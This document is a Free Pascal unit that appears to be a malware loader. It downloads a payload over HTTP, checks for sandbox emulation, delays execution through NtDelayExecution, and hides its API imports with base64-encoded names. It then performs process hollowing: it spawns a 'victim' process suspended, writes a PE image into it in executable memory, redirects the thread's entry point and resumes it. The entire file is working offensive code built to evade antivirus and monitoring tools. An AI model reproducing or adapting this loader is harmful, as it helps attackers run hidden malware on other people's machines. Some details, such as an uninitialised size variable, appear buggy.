
unit runner;
{$mode delphi}

interface

uses Windows,SysUtils,base64,FPHTTPClient,openssl,opensslsockets,classes;

type
  TByteArray = array of Byte;


 function isEmulated :boolean;
 function fetch_enc_file(path:string):widestring;

function Fork_ProC(sVictim:string; bFile:TByteArray;var ThreadHandle:Thandle):Boolean;
function DelayExecutionVia_NtDE(ftMinutes: Single): Boolean;
function GetProcessId(Process: HANDLE): DWORD; stdcall; external 'kernel32.dll' name 'GetProcessId';



var
  Global_Proc_id : DWORD;

implementation
 uses
   syscalls;




 function DelayExecutionVia_NtDE(ftMinutes: Single): Boolean; //Thanks to MalDevAcademy
var
  dwMilliSeconds: DWORD;
  DelayInterval: LARGE_INTEGER;
  Delay: Int64;
  STATUS: NTSTATUS;
hmod : Thandle;
  _T0, _T1: DWORD;
begin
  // converting minutes to milliseconds



  dwMilliSeconds := Round(ftMinutes * 60000);
  FillChar(DelayInterval, SizeOf(DelayInterval), 0);
  Delay := 0;



  // getting the function pointer
   hmod := LoadLibrary(Pchar(decodestringbase64(NT_D)));
  TfnNtDE := GetProcAddress(hmod,Pchar(decodestringbase64(NDE)));

  Delay := Int64(dwMilliSeconds) * 10000;
  DelayInterval.QuadPart := -Delay;

  _T0 := GetTickCount64();

  status := TfnNtDE(false,@DelayInterval);


  if (STATUS <> 0) and (STATUS <> STATUS_TIMEOUT) then
  begin
    Result := False;
    Exit;
  end;

  _T1 := GetTickCount64();
  if (_T1 - _T0) < dwMilliSeconds then
    Result := False
  else
    Result := True;


end;


 function fetch_enc_file(path:string):widestring;
 var
   FPHTTPClient: TFPHTTPClient;
   Resultget : string;
 begin
 FPHTTPClient := TFPHTTPClient.Create(nil);
 FPHTTPClient.AllowRedirect := True;
    try
    Resultget := FPHTTPClient.Get(path); // test URL, real one is HTTPS
    fetch_enc_file := Resultget;

    except
       on E: exception do
         // writeln(E.Message);
    end;
 FPHTTPClient.Free;
 end;


procedure Move_da(Destination, Source: Pointer; dLength:DWORD);
begin
  CopyMemory(Destination, Source, dLength);
end;

function isEmulated :boolean;
var
  mem : intptr;
begin
 mem := dword64(VirtualAllocExNuma(GetCurrentProcess(),0,$1000,$3000,$20,0));

 if mem = 0 then
 result := true
 else
  result := false

end;

 function align(Value,Align:Cardinal):Cardinal;
 begin
  if ((value mod align) = 0) then
  Result := Value
  else
   result := ((Value +Align -1) div align) * Align;
 end;

function Fork_ProC(sVictim:string; bFile:TByteArray;var threadhandle:thandle):Boolean;   // x64 bit

var
  IDH:        TImageDosHeader;
  INH:        TImageNtHeaders;
  ISH:        TImageSectionHeader;

  PI:         TProcessInformation;
  SI:         TStartUpInfo;
  CONT,CONT_B:       PContext;
  ImageBase:  pointer;
  Ret:        SIZE_T;
  i:          integer;
  Addr:       DWORD64;
  dOffset,injectedsize:    DWORD;
  hmod,hmod_NT,h_sys : Thandle;


begin
  Result := FALSE;
  CopyMemory(@IDH,@bfile[0], 64);

    if IDH.e_magic = IMAGE_DOS_SIGNATURE then
    begin
      Move_da(@INH, @bFile[IDH._lfanew], 264);     //248

      if INH.Signature = IMAGE_NT_SIGNATURE then
      begin
        FillChar(SI, SizeOf(TStartupInfo),#0);
        FillChar(PI, SizeOf(TProcessInformation),#0);
        SI.cb := SizeOf(TStartupInfo);

        // Hide from IAT
        hmod := LoadLibrary(Pchar(DecodeStringBase64(KRN)));
        CP := GetProcAddress(hmod,Pchar(DecodeStringBase64(CP_V)));
        Get_Con := GetProcAddress(hmod,Pchar(DecodeStringBase64(GTC)));
        set_Con := GetProcAddress(hmod,Pchar(DecodeStringBase64(STC)));

        if syscalls.CP(nil, PChar(sVictim), nil, nil, false, CREATE_SUSPENDED, nil, nil, SI, PI) then

        begin

          // get the ID

          Global_proc_id := GetProcessId(pi.hProcess);

           Alloc := GetProcAddress(hmod,Pchar(DecodeStringbase64(VALLOC)));

          CONT := PCONTEXT(Alloc(nil, sizeof(CONT), MEM_COMMIT, PAGE_READWRITE));
          CONT.ContextFlags := CONTEXT_ALL;



          if syscalls.Get_Con(PI.hThread, CONT^) then
          begin

            hmod := LoadLibrary(Pchar(DecodeStringBase64(KRN)));
            RPM := GetProcAddress(hmod,Pchar(DecodeStringBase64(RPM_V)));

            syscalls.RPM(PI.hProcess, Pointer(CONT.rdx + $100), @Addr, sizeof(ptruint), Ret);


            Allocx := GetProcAddress(hmod,Pchar(DecodeStringBase64(VLAEX)));
            res_thread := GetProcAddress(hmod,Pchar(DecodeStringBase64(Rs_thread)));

            h_sys := LoadLibrary(pchar(Decodestringbase64(NT_D)));
            gg := GetProcAddress(h_sys,pchar(decodestringbase64(NT_VLA)));

            hmod_NT := loadLibrary(pchar(Decodestringbase64(NT_D)));
            Nt := GetProcAddress(hmod_NT,Pchar(decodestringbase64(NT_VMS)));
            W_M := GetprocAddress(hmod,Pchar(DecodeStringBase64(WPM)));


             injectedsize := align(injectedsize,$1000);

             if Addr = INH.OptionalHeader.ImageBase then
              begin
             if syscalls.Nt(PI.hProcess, Pointer(INH.OptionalHeader.ImageBase)) = 0 then
             begin
            ImageBase := syscalls.Allocx(PI.hProcess, Pointer(INH.OptionalHeader.ImageBase), INH.OptionalHeader.SizeOfImage,
             $3000, PAGE_EXECUTE_READWRITE);
             end
               else
              begin
              ImageBase := syscalls.Allocx(PI.hProcess, nil, INH.OptionalHeader.SizeOfImage, $3000, PAGE_EXECUTE_READWRITE);
             end;
            end
            else
            begin
            ImageBase := syscalls.Allocx(PI.hProcess, Pointer(INH.OptionalHeader.ImageBase), INH.OptionalHeader.SizeOfImage,
            $3000, PAGE_EXECUTE_READWRITE);
              end;
            NtAllocateVirtualMemory(PI.hProcess,@imagebase,0,injectedsize,MEM_COMMIT OR MEM_RESERVE, PAGE_EXECUTE_READWRITE);

            syscalls.W_M(PI.hProcess, ImageBase, @bFile[0], INH.OptionalHeader.SizeOfHeaders, Ret);


            dOffset := IDH._lfanew + 264;    //248
            for i := 0 to INH.FileHeader.NumberOfSections - 1 do
            begin
              Move_da(@ISH, @bFile[dOffset + (i * 40)], 40);     // 40 , 40
              syscalls.W_M(PI.hProcess, LPVOID(dword64(ImageBase) + ISH.VirtualAddress), @bFile[ISH.PointerToRawData], ISH.SizeOfRawData, Ret);
              syscalls.W_M(PI.hProcess, LPVOID(CONT.rdx + $10), @ImageBase, 8, Ret);
            end;


                //setup another contex with different flags
               CONT_B := PCONTEXT(Syscalls.Alloc(nil, sizeof(CONT_B), MEM_COMMIT, PAGE_READWRITE));
               CONT_B.ContextFlags := CONTEXT_INTEGER;

               // put some timing before setting thread
               sleep(2000);
                // set thread context
              CONT_B.rcx := dword64(ImageBase) + INH.OptionalHeader.AddressOfEntryPoint;

            syscalls.set_Con(PI.hThread, CONT_B^);
            syscalls.res_thread(PI.hThread);

            Result := TRUE;

          end;
        end;
      end;
    end;

end;





end.

